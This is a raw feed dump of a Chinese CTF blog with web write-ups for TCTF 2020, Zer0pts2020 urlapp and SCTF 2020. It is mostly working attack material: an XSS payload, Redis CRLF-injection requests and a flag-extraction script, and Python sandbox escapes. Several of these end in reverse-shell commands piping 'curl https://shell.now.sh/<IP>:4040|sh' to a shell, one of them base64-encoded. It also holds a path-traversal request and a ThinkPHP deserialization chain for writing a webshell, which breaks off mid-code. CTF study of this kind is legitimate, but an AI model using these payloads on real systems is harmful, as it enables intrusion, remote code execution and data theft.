class="hljs-string">&#x27;%2b&#x27;</span>).replace(<span class="hljs-string">&#x27;=&#x27;</span>,<span class="hljs-string">&#x27;%3d&#x27;</span>)url = <span class="hljs-string">&quot;/passport?image=&amp;island=&amp;fruit=&amp;name=&amp;data=%27||&#123;%22valueOf%22:new%20%22%22.constructor.constructor(atob(%27&quot;</span>+ data +<span class="hljs-string">&quot;%27))&#125;%2b1//&quot;</span>print(url)</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>FFI</tag>
      
      <tag>一种列文件的方法</tag>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TCTF知识点的记录</title>
    <link href="/2020/07/16/TCTF%E7%9F%A5%E8%AF%86%E7%82%B9%E7%9A%84%E8%AE%B0%E5%BD%95/"/>
    <url>/2020/07/16/TCTF%E7%9F%A5%E8%AF%86%E7%82%B9%E7%9A%84%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h2 id="easy-php"><a href="#easy-php" class="headerlink" title="easy php"></a>easy php</h2><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$file_list</span> = <span class="hljs-keyword">array</span>();<span class="hljs-variable">$it</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$it</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;    <span class="hljs-variable">$file_list</span>[] = <span class="hljs-variable">$f</span>-&gt;__toString();&#125;<span class="hljs-variable">$it</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///.*&quot;</span>);<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$it</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;    <span class="hljs-variable">$file_list</span>[] = <span class="hljs-variable">$f</span>-&gt;__toString();&#125;sort(<span class="hljs-variable">$file_list</span>);<span class="hljs-keyword">echo</span> sizeof(<span class="hljs-variable">$file_list</span>);<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$file_list</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$f&#125;</span>&lt;br/&gt;&quot;</span>;&#125;<span class="hljs-meta">?&gt;</span><span class="hljs-comment">// glob不匹配.开头的文件，所以加一个 .* 匹配.开头的文件名</span></code></pre><p>这种也可以列文件名出来，<code>disable_function</code>绕的方法加一</p><p>然后是加载FFI调用c函数</p><pre><code class="hljs php"><span class="hljs-variable">$ffi</span>=FFI::load(<span class="hljs-string">&quot;/flag.h&quot;</span>);<span class="hljs-variable">$a</span> = <span class="hljs-variable">$ffi</span>-&gt;flag_fUn3t1on_fFi();<span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">100</span>;<span class="hljs-variable">$i</span>++)&#123;<span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>[<span class="hljs-variable">$i</span>];&#125;</code></pre><p>noeasyphp 是预期解，读不到<code>flag.h</code>要去弄内存泄漏，看不懂了，</p><p><a href="https://skysec.top/2020/06/27/2020-TCTF-Online-Web-WriteUp/#easy-php">https://skysec.top/2020/06/27/2020-TCTF-Online-Web-WriteUp/#easy-php</a></p><h2 id="Wechat-Generator"><a href="#Wechat-Generator" class="headerlink" title="Wechat Generator"></a>Wechat Generator</h2><pre><code class="hljs ，">&lt;img width&#x3D;&quot;512&quot; height&#x3D;&quot;512&quot; href&#x3D;&quot;text:&#x2F;flag&quot;&gt;&#x2F;proc&#x2F;self&#x2F;  当前目录利用上面的读 app.py&lt;meta http-equiv&#x3D;&quot;Refresh&quot; content&#x3D;&quot;0;url&#x3D;http:&#x2F;&#x2F;www.xxx.com&quot;&gt;利用meta转跳弹xss</code></pre><p><a href="https://skysec.top/2020/06/27/2020-TCTF-Online-Web-WriteUp/#lottery">https://skysec.top/2020/06/27/2020-TCTF-Online-Web-WriteUp/#lottery</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>FFI</tag>
      
      <tag>一种列文件的方法</tag>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>TGSCTF2020</title>
    <link href="/2020/07/13/TGSCTF2020/"/>
    <url>/2020/07/13/TGSCTF2020/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>[Zer0pts2020]urlapp</title>
    <link href="/2020/07/12/Zer0pts2020-urlapp/"/>
    <url>/2020/07/12/Zer0pts2020-urlapp/</url>
    
    <content type="html"><![CDATA[<p>源码</p><pre><code class="hljs ruby"><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;sinatra&#x27;</span><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;uri&#x27;</span><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;socket&#x27;</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">connect</span><span class="hljs-params">()</span></span>  sock = TCPSocket.open(<span class="hljs-string">&quot;redis&quot;</span>, <span class="hljs-number">6379</span>)  <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ping(sock) <span class="hljs-keyword">then</span>    exit  <span class="hljs-keyword">end</span>  <span class="hljs-keyword">return</span> sock<span class="hljs-keyword">end</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query</span><span class="hljs-params">(sock, cmd)</span></span>  sock.write(cmd + <span class="hljs-string">&quot;\r\n&quot;</span>)<span class="hljs-keyword">end</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">recv</span><span class="hljs-params">(sock)</span></span>  data = sock.gets  <span class="hljs-keyword">if</span> data == <span class="hljs-literal">nil</span> <span class="hljs-keyword">then</span>    <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>  <span class="hljs-keyword">elsif</span> data[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;+&quot;</span> <span class="hljs-keyword">then</span>    <span class="hljs-keyword">return</span> data[<span class="hljs-number">1</span>..-<span class="hljs-number">1</span>].strip  <span class="hljs-keyword">elsif</span> data[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;$&quot;</span> <span class="hljs-keyword">then</span>    <span class="hljs-keyword">if</span> data == <span class="hljs-string">&quot;$-1\r\n&quot;</span> <span class="hljs-keyword">then</span>      <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>    <span class="hljs-keyword">end</span>    <span class="hljs-keyword">return</span> sock.gets.strip  <span class="hljs-keyword">end</span>  <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><span class="hljs-keyword">end</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ping</span><span class="hljs-params">(sock)</span></span>  query(sock, <span class="hljs-string">&quot;ping&quot;</span>)  <span class="hljs-keyword">return</span> recv(sock) == <span class="hljs-string">&quot;PONG&quot;</span><span class="hljs-keyword">end</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">set</span><span class="hljs-params">(sock, key, value)</span></span>  query(sock, <span class="hljs-string">&quot;SET <span class="hljs-subst">#&#123;key&#125;</span> <span class="hljs-subst">#&#123;value&#125;</span>&quot;</span>)  <span class="hljs-keyword">return</span> recv(sock) == <span class="hljs-string">&quot;OK&quot;</span><span class="hljs-keyword">end</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span><span class="hljs-params">(sock, key)</span></span>  query(sock, <span class="hljs-string">&quot;GET <span class="hljs-subst">#&#123;key&#125;</span>&quot;</span>)  <span class="hljs-keyword">return</span> recv(sock)<span class="hljs-keyword">end</span>before <span class="hljs-keyword">do</span>  sock = connect()  set(sock, <span class="hljs-string">&quot;flag&quot;</span>, File.read(<span class="hljs-string">&quot;flag.txt&quot;</span>).strip)<span class="hljs-keyword">end</span>get <span class="hljs-string">&#x27;/&#x27;</span> <span class="hljs-keyword">do</span>  <span class="hljs-keyword">if</span> params.has_key?(<span class="hljs-symbol">:q</span>) <span class="hljs-keyword">then</span>    q = params[<span class="hljs-symbol">:q</span>]    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (q =~ <span class="hljs-regexp">/^[0-9a-f]&#123;16&#125;$/</span>)      <span class="hljs-keyword">return</span>    <span class="hljs-keyword">end</span>    sock = connect()    url = get(sock, q)    redirect url  <span class="hljs-keyword">end</span>  send_file <span class="hljs-string">&#x27;index.html&#x27;</span><span class="hljs-keyword">end</span>post <span class="hljs-string">&#x27;/&#x27;</span> <span class="hljs-keyword">do</span>  <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> params.has_key?(<span class="hljs-symbol">:url</span>) <span class="hljs-keyword">then</span>    <span class="hljs-keyword">return</span>  <span class="hljs-keyword">end</span>  url = params[<span class="hljs-symbol">:url</span>]  <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (url =~ URI.regexp) <span class="hljs-keyword">then</span>    <span class="hljs-keyword">return</span>  <span class="hljs-keyword">end</span>  key = Random.urandom(<span class="hljs-number">8</span>).unpack(<span class="hljs-string">&quot;H*&quot;</span>)[<span class="hljs-number">0</span>]  sock = connect()  set(sock, key, url)  <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;request.host&#125;</span>:<span class="hljs-subst">#&#123;request.port&#125;</span>/?q=<span class="hljs-subst">#&#123;key&#125;</span>&quot;</span><span class="hljs-keyword">end</span></code></pre><p>存在CRLF注入，可以直接操作redis，可以看这两个函数</p><pre><code class="hljs ruby"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">query</span><span class="hljs-params">(sock, cmd)</span></span>  sock.write(cmd + <span class="hljs-string">&quot;\r\n&quot;</span>)<span class="hljs-keyword">end</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">set</span><span class="hljs-params">(sock, key, value)</span></span>  query(sock, <span class="hljs-string">&quot;SET <span class="hljs-subst">#&#123;key&#125;</span> <span class="hljs-subst">#&#123;value&#125;</span>&quot;</span>)  <span class="hljs-keyword">return</span> recv(sock) == <span class="hljs-string">&quot;OK&quot;</span><span class="hljs-keyword">end</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span><span class="hljs-params">(sock, key)</span></span>  query(sock, <span class="hljs-string">&quot;GET <span class="hljs-subst">#&#123;key&#125;</span>&quot;</span>)  <span class="hljs-keyword">return</span> recv(sock)<span class="hljs-keyword">end</span></code></pre><p>调用了set和get都可以造成CRLF注入，从代码中看flag被赋予了flag变量，设法读出来就可以了。读完整的flag会报错，所以要对flag进行修改才能带出来，估计是<code>redirect</code>的锅，有两种修改方法，一是吧flag中的第一个改成？，第二种是吧括号换成其他的符号</p><pre><code class="hljs apache"><span class="hljs-comment">## f改？</span><span class="hljs-comment">### 第一种</span><span class="hljs-attribute">POST</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><span class="hljs-attribute">Host</span>: ce<span class="hljs-number">650037</span>-<span class="hljs-number">705</span>e-<span class="hljs-number">4</span>a<span class="hljs-number">5</span>b-b<span class="hljs-number">655</span>-<span class="hljs-number">372</span>aeca<span class="hljs-number">9</span>df<span class="hljs-number">57</span>.node<span class="hljs-number">3</span>.buuoj.cn<span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win<span class="hljs-number">64</span>; x<span class="hljs-number">64</span>; rv:<span class="hljs-number">78</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">78</span>.<span class="hljs-number">0</span><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/webp,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">99</span><span class="hljs-attribute">Origin</span>: http://ce<span class="hljs-number">650037</span>-<span class="hljs-number">705</span>e-<span class="hljs-number">4</span>a<span class="hljs-number">5</span>b-b<span class="hljs-number">655</span>-<span class="hljs-number">372</span>aeca<span class="hljs-number">9</span>df<span class="hljs-number">57</span>.node<span class="hljs-number">3</span>.buuoj.cn<span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Referer</span>: http://ce<span class="hljs-number">650037</span>-<span class="hljs-number">705</span>e-<span class="hljs-number">4</span>a<span class="hljs-number">5</span>b-b<span class="hljs-number">655</span>-<span class="hljs-number">372</span>aeca<span class="hljs-number">9</span>df<span class="hljs-number">57</span>.node<span class="hljs-number">3</span>.buuoj.cn/<span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><span class="hljs-attribute">url</span>=http://<span class="hljs-number">23333</span>.com/<span class="hljs-attribute">BITOP</span> AND b<span class="hljs-number">6</span>b<span class="hljs-number">73122</span>e<span class="hljs-number">7228</span>dec flag flag<span class="hljs-attribute">BITFIELD</span> b<span class="hljs-number">6</span>b<span class="hljs-number">73122</span>e<span class="hljs-number">7228</span>dec SET u<span class="hljs-number">8</span> #<span class="hljs-number">0</span> <span class="hljs-number">63</span><span class="hljs-comment">### 第二种</span><span class="hljs-attribute">url</span>=http://<span class="hljs-number">23333</span>.com/<span class="hljs-attribute">SET</span> tmp <span class="hljs-number">1</span><span class="hljs-attribute">BITOP</span> XOR abababababababab flag tmp<span class="hljs-attribute">setbit</span> abababababababab <span class="hljs-number">1</span> <span class="hljs-number">0</span><span class="hljs-attribute">setbit</span> abababababababab <span class="hljs-number">2</span> <span class="hljs-number">1</span><span class="hljs-attribute">setbit</span> abababababababab <span class="hljs-number">4</span> <span class="hljs-number">1</span><span class="hljs-comment">### 改双括号  由于括号的位置位置，这是buu上的flag 括号在第5个和42个，所以写成 #4 #41。官方解也是这种，改下他的脚本就能解buu的题了</span><span class="hljs-attribute">url</span>=http://<span class="hljs-number">23333</span>.com/<span class="hljs-attribute">BITOP</span> AND b<span class="hljs-number">5</span>b<span class="hljs-number">73122</span>e<span class="hljs-number">7228</span>de<span class="hljs-number">8</span> flag flag<span class="hljs-attribute">BITFIELD</span> b<span class="hljs-number">5</span>b<span class="hljs-number">73122</span>e<span class="hljs-number">7228</span>de<span class="hljs-number">8</span> SET u<span class="hljs-number">8</span> #<span class="hljs-number">0</span> <span class="hljs-number">95</span> SET u<span class="hljs-number">8</span> #<span class="hljs-number">41</span> <span class="hljs-number">95</span></code></pre><p>官方解</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> os<span class="hljs-keyword">import</span> re<span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> hexlifySERVER = <span class="hljs-string">&#x27;http://ce650037-705e-4a5b-b655-372aeca9df57.node3.buuoj.cn/&#x27;</span>r = requests.post(SERVER, data=&#123;    <span class="hljs-string">&quot;url&quot;</span>: <span class="hljs-string">&quot;http://example.com/&quot;</span>    &#125;)short = r.text.split(<span class="hljs-string">&quot;=&quot;</span>)[<span class="hljs-number">1</span>]index = <span class="hljs-number">8</span><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:    key = hexlify(os.urandom(<span class="hljs-number">8</span>)).decode()    requests.get(SERVER, params=&#123;        <span class="hljs-string">&quot;q&quot;</span>: <span class="hljs-string">&quot;&#123;short&#125;\n\r\nBITOP AND &#123;key&#125; flag flag\r\nBITFIELD &#123;key&#125; SET u8 #4 95 SET u8 #&#123;index&#125; 95\r\n&quot;</span>.<span class="hljs-built_in">format</span>(short=short, key=key, index=index)    &#125;)    <span class="hljs-keyword">try</span>:        r = requests.get(SERVER, params=&#123;            <span class="hljs-string">&quot;q&quot;</span>: key        &#125;)        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;404&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span>  r.text:            print(r.text)            <span class="hljs-keyword">break</span>    <span class="hljs-keyword">except</span>:        <span class="hljs-keyword">pass</span>    index += <span class="hljs-number">1</span>    print(index, key)</code></pre><p>参考：</p><p><a href="https://redislabs.com/redis-best-practices/time-series/time-series-bitfields/">https://redislabs.com/redis-best-practices/time-series/time-series-bitfields/</a></p><p><a href="https://glotozz.github.io/2020/04/02/buuctf-wp/#zer0pts2020urlapp/">https://glotozz.github.io/2020/04/02/buuctf-wp/#zer0pts2020urlapp/</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>redis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SCTF2020</title>
    <link href="/2020/07/08/SCTF/"/>
    <url>/2020/07/08/SCTF/</url>
    
    <content type="html"><![CDATA[<h2 id="CloudDisk"><a href="#CloudDisk" class="headerlink" title="CloudDisk"></a>CloudDisk</h2><p><code>https://github.com/dlau/koa-body/issues/75</code></p><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;files&quot;</span>:&#123;<span class="hljs-attr">&quot;file&quot;</span>:&#123;<span class="hljs-attr">&quot;path&quot;</span>:<span class="hljs-string">&quot;/proc/self/cwd/flag&quot;</span>,<span class="hljs-attr">&quot;name&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>&#125;&#125;&#125;</code></pre><h2 id="pysandbox"><a href="#pysandbox" class="headerlink" title="pysandbox"></a>pysandbox</h2><p><code>cmd=app.static_folder=request.form[request.method]&amp;POST=/</code></p><p>更改静态目录为 / ，直接访问/static/flag就可以下载到flag</p><p>Flask 中 </p><pre><code class="hljs actionscript">static_folde 设置静态文件夹 默认<span class="hljs-keyword">static</span>文件夹static_url_path 访问方式 默认/<span class="hljs-keyword">static</span></code></pre><h2 id="pysandbox2"><a href="#pysandbox2" class="headerlink" title="pysandbox2"></a>pysandbox2</h2><p>源码</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, requestapp = Flask(__name__)<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">security</span>():</span>    secret = request.form[<span class="hljs-string">&quot;cmd&quot;</span>]    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> secret:        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-number">42</span> &lt;= <span class="hljs-built_in">ord</span>(i) &lt;= <span class="hljs-number">122</span>: <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;error!&quot;</span>    exec(secret)    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;xXXxXXx&quot;</span><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>)</code></pre><p>解1：</p><p><a href="http://phoebe233.cn/index.php/archives/53/#pysandbox2">http://phoebe233.cn/index.php/archives/53/#pysandbox2</a></p><pre><code class="hljs python">__builtins__.<span class="hljs-built_in">ord</span>=<span class="hljs-keyword">lambda</span>*args:<span class="hljs-number">45</span> 覆盖<span class="hljs-built_in">ord</span> 绕过限制，就可以执行任意代码了app.view_functions[<span class="hljs-string">&#x27;security&#x27;</span>] = <span class="hljs-keyword">lambda</span>: <span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;curl https://shell.now.sh/120.24.42.229:4040|sh&#x27;</span>).read()   可以覆盖security，也可以直接一点直接执行<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;curl https://shell.now.sh/120.24.42.229:4040|sh&#x27;</span>).read()</code></pre><p>解2：</p><p><a href="http://www.chara.pub/blog/2020/07/07/sctf-2020-writeup/#web-pythonsandbox2">http://www.chara.pub/blog/2020/07/07/sctf-2020-writeup/#web-pythonsandbox2</a></p><pre><code class="hljs apache"><span class="hljs-comment">#把static的参数名称改成command</span><span class="hljs-attribute">app</span>.url_map._rules[<span class="hljs-number">0</span>].rule = <span class="hljs-string">&quot;/static/&lt;command&gt;&quot;</span><span class="hljs-comment">#因为新建正则需要括号，找一个方法调用static的路由的compile方法，让他生成一个新的正则</span><span class="hljs-attribute">app</span>.view_functions[&#x27;security&#x27;]=app.url_map._rules[<span class="hljs-number">0</span>].compile<span class="hljs-comment">##从哪个包里找到os</span><span class="hljs-attribute">app</span>.view_functions[&#x27;static&#x27;]=app.config.__class__.__init__.__globals__[&#x27;os&#x27;].system<span class="hljs-comment">#然后依次post /,get /static/getshell指令编码后</span><span class="hljs-comment">#getshell指令不能带/</span><span class="hljs-attribute">http</span>://<span class="hljs-number">39.104.90.30:10000</span>/?POST=/static/&lt;command&gt;securitystaticos<span class="hljs-attribute">cmd</span>=a=request.args[request.method];app.url_map._rules[<span class="hljs-number">1</span>].rule=a[:<span class="hljs-number">17</span>];app.view_functions[a[<span class="hljs-number">17</span>:<span class="hljs-number">25</span>]]=app.url_map._rules[<span class="hljs-number">1</span>].compile;app.view_functions[a[<span class="hljs-number">25</span>:<span class="hljs-number">31</span>]]=app.config.__class__.__init__.__globals__[a[<span class="hljs-number">31</span>:]].system<span class="hljs-attribute">http</span>://<span class="hljs-number">39.104.90.30:10000</span>/static/curl$IFS$<span class="hljs-number">9</span>ctf.chara.pub:<span class="hljs-number">1234</span>%<span class="hljs-number">7</span>Csh</code></pre><p>我没域名qwq  base64了一下才成</p><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">39.104.25.107:10002</span>/static/echo%<span class="hljs-number">24</span>IFS%<span class="hljs-number">249</span>%<span class="hljs-number">22</span>Y<span class="hljs-number">3</span>VybCBodHRwczovL<span class="hljs-number">3</span>NoZWxsLm<span class="hljs-number">5</span>vdy<span class="hljs-number">5</span>zaC<span class="hljs-number">8</span>xMjAuMjQuNDIuMjI<span class="hljs-number">5</span>OjQwNDB<span class="hljs-number">8</span>c<span class="hljs-number">2</span>g%<span class="hljs-number">3</span>D%<span class="hljs-number">22</span>%<span class="hljs-number">7</span>Cbase<span class="hljs-number">64</span>%<span class="hljs-number">24</span>IFS%<span class="hljs-number">249</span>-d%<span class="hljs-number">7</span>Csh</code></pre><p>解3：</p><p>官方<a href="https://github.com/SycloverSecurity/SCTF2020/tree/master/Web/pysandbox">https://github.com/SycloverSecurity/SCTF2020/tree/master/Web/pysandbox</a></p><pre><code class="hljs roboconf">劫持werkzeug.urls.url_parse = evalPOST __import__(&#x27;os&#x27;).system(&#x27;curl$&#123;<span class="hljs-attribute">IFS&#125;https</span>://shell<span class="hljs-variable">.now</span><span class="hljs-variable">.sh</span>/120.24.42.229:4040|sh&#x27;) HTTP/1.1Host: __loader__User-Agent: Mozilla/5.0 (Windows NT 10.0; <span class="hljs-attribute">Win64; x64; rv</span>:78.0) Gecko/20100101 Firefox/78.0Accept: text/html,application/xhtml+xml,application/xml;<span class="hljs-attribute">q=0.9,image/webp,*/*;q=0.8</span><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;<span class="hljs-attribute">q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflateConnection: closeContent-MD5: _bootstrap_externalContent-Encoding: werkzeug<span class="hljs-variable">.urls</span>Upgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 246cmd=request<span class="hljs-variable">.__class__</span><span class="hljs-variable">._get_current_object</span><span class="hljs-variable">.__globals__</span>[request<span class="hljs-variable">.host</span>]<span class="hljs-variable">.__class__</span><span class="hljs-variable">.__weakref__</span><span class="hljs-variable">.__objclass__</span><span class="hljs-variable">.contents</span><span class="hljs-variable">.__globals__</span>[request<span class="hljs-variable">.host</span>]<span class="hljs-variable">.exec_module</span><span class="hljs-variable">.__globals__</span>[request<span class="hljs-variable">.content_md</span>5]<span class="hljs-variable">._bootstrap</span><span class="hljs-variable">.sys</span><span class="hljs-variable">.modules</span>[request<span class="hljs-variable">.content_encoding</span>]<span class="hljs-variable">.url_parse</span>=eval</code></pre><h2 id="bestlanguage"><a href="#bestlanguage" class="headerlink" title="bestlanguage"></a>bestlanguage</h2><p>非预期1：<a href="http://phoebe233.cn/index.php/archives/53/#bestlanguage">http://phoebe233.cn/index.php/archives/53/#bestlanguage</a></p><pre><code class="hljs awk">curl --path-as-is http:<span class="hljs-regexp">//</span><span class="hljs-number">39.104</span>.<span class="hljs-number">93.188</span><span class="hljs-regexp">/index.php/</span>tmp<span class="hljs-regexp">/../</span>../flag</code></pre><p>非预期2：</p><pre><code class="hljs apache"><span class="hljs-attribute">CVE</span>-<span class="hljs-number">2018</span>-<span class="hljs-number">15133</span>一把梭<span class="hljs-attribute">https</span>://github.com/kozmic/laravel-poc-CVE-<span class="hljs-number">2018</span>-<span class="hljs-number">15133</span><span class="hljs-attribute">cookie</span>打</code></pre><p>预期：</p><p><a href="https://github.com/SycloverSecurity/SCTF2020/tree/master/Web/bestlanguage/Write-up">https://github.com/SycloverSecurity/SCTF2020/tree/master/Web/bestlanguage/Write-up</a></p><h2 id="UnsafeDefenseSystem"><a href="#UnsafeDefenseSystem" class="headerlink" title="UnsafeDefenseSystem"></a>UnsafeDefenseSystem</h2><p><a href="https://xz.aliyun.com/t/7457#toc-4">https://xz.aliyun.com/t/7457#toc-4</a></p><p>thinkphp写shell</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">process</span>\<span class="hljs-title">pipes</span>;<span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">Pivot</span>;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pipes</span></span>&#123;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Windows</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Pipes</span></span>&#123;    <span class="hljs-keyword">private</span> <span class="hljs-variable">$files</span> = [];    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;files = [<span class="hljs-keyword">new</span> Pivot()];<span class="hljs-comment">//触发Model __toString(),子类Pivot合适</span>    &#125;&#125;<span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>;<span class="hljs-comment">#Relation</span><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">db</span>\<span class="hljs-title">Query</span>;<span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Relation</span></span>&#123;    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$selfRelation</span>;    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$query</span>;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;selfRelation = <span class="hljs-literal">false</span>;        <span class="hljs-keyword">$this</span>-&gt;query = <span class="hljs-keyword">new</span> Query();<span class="hljs-comment">#class Query</span>    &#125;&#125;<span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">relation</span>;<span class="hljs-comment">#OneToOne HasOne</span><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">Relation</span>;<span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OneToOne</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Relation</span></span>&#123;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-built_in">parent</span>::__construct();    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HasOne</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">OneToOne</span></span>&#123;    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$bindAttr</span> = [];    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-built_in">parent</span>::__construct();        <span class="hljs-keyword">$this</span>-&gt;bindAttr = [<span class="hljs-string">&quot;no&quot;</span>,<span class="hljs-string">&quot;123&quot;</span>];    &#125;&#125;<span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">console</span>;<span class="hljs-comment">#Output</span><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">session</span>\<span 